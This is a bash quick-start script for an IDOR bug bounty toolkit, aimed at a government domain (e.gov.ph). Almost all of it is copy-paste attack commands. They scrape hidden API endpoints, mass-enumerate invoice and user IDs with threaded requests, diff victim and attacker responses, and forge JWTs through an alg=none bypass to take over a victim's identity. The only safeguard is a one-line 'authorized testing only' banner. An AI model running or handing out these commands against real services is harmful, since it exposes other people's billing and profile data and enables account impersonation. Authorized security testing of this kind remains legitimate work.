#!/bin/bash
# ============================================================
# IDOR Bug Bounty Workspace — Quick Start Commands
# ============================================================
# Copy-paste any command below directly into your terminal.
# Replace placeholder values with real target data.
#
# ⚠️  For authorized bug bounty testing only.
# ============================================================

BASE="https://e.gov.ph"
ATTACKER_TOKEN="YOUR_BEARER_TOKEN"
ATTACKER_COOKIE="session=YOUR_SESSION_COOKIE"
VICTIM_TOKEN="VICTIM_BEARER_TOKEN"
VICTIM_ID="12345"

# ─── Step 0: Verify setup ──────────────────────────────────────────────────────
echo "Verifying workspace setup..."
python3 test_setup.py

# ─── Step 1: Extract endpoints from JavaScript files ─────────────────────────
# Find all hidden API endpoints on the target
python3 poc/scripts/js_endpoint_extractor.py \
  --target "$BASE" \
  --token "$ATTACKER_TOKEN" \
  --output endpoints.json

# ─── Step 2: GET Parameter Enumerator ────────────────────────────────────────
# Basic IDOR enumeration via URL parameter
python3 poc/scripts/idor_enum.py \
  --url "$BASE/api/billing/invoice" \
  --param invoice_id \
  --start 1 \
  --end 500 \
  --token "$ATTACKER_TOKEN" \
  --output idor_results.json

# ─── Step 3: Threaded Mass Enumerator (faster) ───────────────────────────────
# Faster version with concurrent threads for large ranges
python3 poc/scripts/threaded_idor_enum.py \
  --url "$BASE/api/billing/invoice" \
  --param invoice_id \
  --start 1 \
  --end 5000 \
  --threads 15 \
  --token "$ATTACKER_TOKEN" \
  --output threaded_results.json

# ─── Step 4: POST Body Tester ────────────────────────────────────────────────
# IDOR in POST request body
python3 poc/scripts/post_idor_tester.py \
  --url "$BASE/api/user/profile" \
  --method POST \
  --body '{"user_id": 1, "action": "view"}' \
  --param user_id \
  --start 1 \
  --end 200 \
  --token "$ATTACKER_TOKEN" \
  --output post_idor_results.json

# ─── Step 5: Blind IDOR Response Differ ──────────────────────────────────────
# Compare victim vs attacker response to detect blind IDOR
python3 poc/scripts/blind_idor_differ.py \
  --url "$BASE/api/billing/invoice?invoice_id=$VICTIM_ID" \
  --victim-token "$VICTIM_TOKEN" \
  --attacker-token "$ATTACKER_TOKEN" \
  --diff \
  --output blind_idor_report.json

# ─── Step 6: JWT / Cookie IDOR Tester ────────────────────────────────────────
# Forge JWT by swapping user_id field (alg=none bypass)
python3 poc/scripts/jwt_idor_tester.py \
  --url "$BASE/api/profile" \
  --mode jwt \
  --token "$ATTACKER_TOKEN" \
  --field user_id \
  --victim-id "$VICTIM_ID" \
  --output jwt_idor_report.json

# ─── Interactive Menu (recommended) ──────────────────────────────────────────
# Launch the full interactive menu instead of running individual scripts
python3 run.py
